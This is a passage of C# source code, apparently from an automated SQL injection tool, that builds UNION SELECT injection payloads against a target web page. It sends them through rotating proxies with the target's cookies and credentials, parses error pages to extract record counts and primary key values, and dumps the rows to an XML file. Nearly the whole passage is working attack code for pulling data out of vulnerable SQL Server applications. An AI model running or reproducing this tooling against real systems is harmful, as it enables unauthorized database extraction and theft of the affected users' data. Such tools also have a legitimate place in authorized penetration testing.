			_AttackParams[_VectorName] = GeneralPurposeUnionTextSelect("convert(int, char(58) + convert(char, count(*)))", values[0], null);

			ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);
			ResultText = ParsePage.ParseUnionSelectForVarchar(ResultPage, _Plugin);

			if (ResultText.Length > 0)
			{
				ResultText = ResultText.Substring(1, ResultText.Length - 1);

				retVal.RecordCount = Convert.ToInt64(ResultText.Trim());
			}
			else
			{
				retVal.RecordCount = -1;
			}
			return retVal;
		}
	 
		private GlobalDS.PrimaryKey IteratePrimaryKey(string TableName, string KeyName, GlobalDS.PrimaryKey CurrentPrimaryKey, SqlDbType PrimaryKeyType)
		{
			StringBuilder WhereClause = new StringBuilder();

			if (CurrentPrimaryKey.Name == KeyName)
			{
				WhereClause.Append(KeyName).Append(" > ").Append(CurrentPrimaryKey.Value);
			}

			_AttackParams[_VectorName] = GeneralPurposeUnionTextSelect("char(58) + convert(char, min(" + KeyName + ")) + char(58)", TableName, WhereClause.ToString());

			string ResultPage =  httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);
			string ResultText = ParsePage.ParseUnionSelectForVarchar(ResultPage, _Plugin);

			ResultText = ResultText.Substring(1, ResultText.Length-2);						

			string WorkingText = "";
			switch(PrimaryKeyType)
			{
				case SqlDbType.VarChar: case SqlDbType.Char: case SqlDbType.NChar: case SqlDbType.NText: 
				case SqlDbType.NVarChar: case SqlDbType.Text: 
					StringBuilder ElementBuilder = new StringBuilder();

					//split
					char[] TextElements = ResultText.ToCharArray();
					for (int i=0; i < TextElements.Length; i++)
					{
						ElementBuilder.Append("char(").Append(Char.GetNumericValue(TextElements[i])).Append(") + ");
					}
					ElementBuilder.Remove(ElementBuilder.Length -2,2); // remove trailing '+ '

					WorkingText = ElementBuilder.ToString();
					break;

				default:
					WorkingText = ResultText.Trim();
					break;
			}
				


			GlobalDS.PrimaryKey retVal = new GlobalDS.PrimaryKey();
			retVal.Name = KeyName;
			retVal.Value = WorkingText;
			retVal.OutputValue = ResultText;

			return retVal;
		}
 
		private void OutputRecordToFile(ref XmlTextWriter xOutput, Hashtable DataRecord, GlobalDS.PrimaryKey pk)
		{
			xOutput.WriteStartElement("DataRecord");
			xOutput.WriteStartAttribute("PrimaryKey", null);
			xOutput.WriteString(pk.Name);
			xOutput.WriteEndAttribute();
			xOutput.WriteStartAttribute("PrimaryKeyValue", null);
			xOutput.WriteString(pk.OutputValue);
			xOutput.WriteEndAttribute();

			foreach(string Key in DataRecord.Keys)
			{
				xOutput.WriteStartElement(Key);
				xOutput.WriteString(DataRecord[Key].ToString());	
				xOutput.WriteEndElement();
			}

			xOutput.WriteEndElement();
		}	 
	}

	/// <summary>An exception generated when an error plugin fails the version check</summary>
	public class UnsupportedSQLErrorVersionException : Exception
	{
		private string _VersionErrorPageHtml;
		private string _HavingErrorPageHtml;

		// {{{ HavingErrorPageHtml Property
		/// <summary>
		/// The page generated by a having clause
		/// </summary>
		public string HavingErrorPageHtml
		{
			get
			{
				return _HavingErrorPageHtml;
			}
		}
		// }}}

		// {{{ ErrorPageHtml Property
		/// <summary>
		/// The error generated that should display the SQL Server version
		/// </summary>
		public string VersionErrorPageHtml
		{
			get
			{
				return _VersionErrorPageHtml;
			}
		}
		// }}}

		// {{{ Constructor
		/// <summary>
		/// Instantiates a new UnsupportedSQLErrorVersionException
		/// </summary>
		/// <param name="HtmlWithVersionString">The error generated that should display the SQL Server version</param>
		/// <param name="HtmlWithHavingString">The page generated by a having clause</param>
		public UnsupportedSQLErrorVersionException(string HtmlWithVersionString, string HtmlWithHavingString)
		{
			_VersionErrorPageHtml = HtmlWithVersionString;
			_HavingErrorPageHtml = HtmlWithHavingString;
		}
		// }}}
	}
}
